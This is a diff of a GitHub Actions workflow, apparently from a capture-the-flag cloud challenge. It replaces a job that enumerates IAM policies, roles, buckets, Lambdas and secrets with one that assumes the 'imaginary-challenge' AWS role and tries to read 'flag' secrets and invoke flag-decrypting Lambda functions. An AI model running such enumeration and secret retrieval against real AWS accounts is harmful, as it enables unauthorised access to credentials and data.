@@ -1,4 +1,4 @@
-name: Diagnose Role Permissions
+name: Get Flag (Targeted)
 
 on: workflow_dispatch
 
@@ -7,7 +7,7 @@ permissions:
   contents: read
 
 jobs:
-  diagnose:
+  get-flag:
     runs-on: ubuntu-latest
     steps:
       - name: Configure AWS Credentials
@@ -16,25 +16,27 @@ jobs:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
 
-      - name: Check Role Permissions
+      - name: Try to Get Secret Named 'flag'
         run: |
-          echo "=== Checking attached policies ==="
-          aws iam list-attached-role-policies --role-name imaginary-challenge
+          echo "=== Trying to get secret named 'flag' ==="
+          aws secretsmanager get-secret-value --secret-id flag --query SecretString --output text || echo "Not found"
 
-          echo "=== Checking inline policies ==="
-          aws iam get-role-policy --role-name imaginary-challenge --policy-name inline-policy 2>/dev/null || echo "No inline policy"
+      - name: Try to Get Secret Named 'encrypted-flag'
+        run: |
+          echo "=== Trying to get secret named 'encrypted-flag' ==="
+          aws secretsmanager get-secret-value --secret-id encrypted-flag --query SecretString --output text || echo "Not found"
 
-          echo "=== Listing all IAM roles (if allowed) ==="
-          aws iam list-roles --query 'Roles[].RoleName' 2>/dev/null || echo "No permission to list roles"
+      - name: Try to Get Secret Named 'imaginary-flag'
+        run: |
+          echo "=== Trying to get secret named 'imaginary-flag' ==="
+          aws secretsmanager get-secret-value --secret-id imaginary-flag --query SecretString --output text || echo "Not found"
 
-          echo "=== Trying to get caller identity ==="
-          aws sts get-caller-identity
+      - name: Try to Invoke Lambda Function 'get-flag'
+        run: |
+          echo "=== Trying to invoke Lambda function 'get-flag' ==="
+          aws lambda invoke --function-name get-flag /tmp/flag.txt && cat /tmp/flag.txt || echo "Lambda invocation failed"
 
-          echo "=== Trying to list S3 buckets ==="
-          aws s3 ls 2>/dev/null || echo "No S3 access"
-
-          echo "=== Trying to list Lambda functions ==="
-          aws lambda list-functions --query 'Functions[].FunctionName' 2>/dev/null || echo "No Lambda access"
-
-          echo "=== Trying to list Secrets Manager secrets ==="
-          aws secretsmanager list-secrets --query 'SecretList[].Name' 2>/dev/null || echo "No Secrets Manager access"
+      - name: Try to Invoke Lambda Function 'decrypt-flag'
+        run: |
+          echo "=== Trying to invoke Lambda function 'decrypt-flag' ==="
+          aws lambda invoke --function-name decrypt-flag /tmp/flag.txt && cat /tmp/flag.txt || echo "Lambda invocation failed"
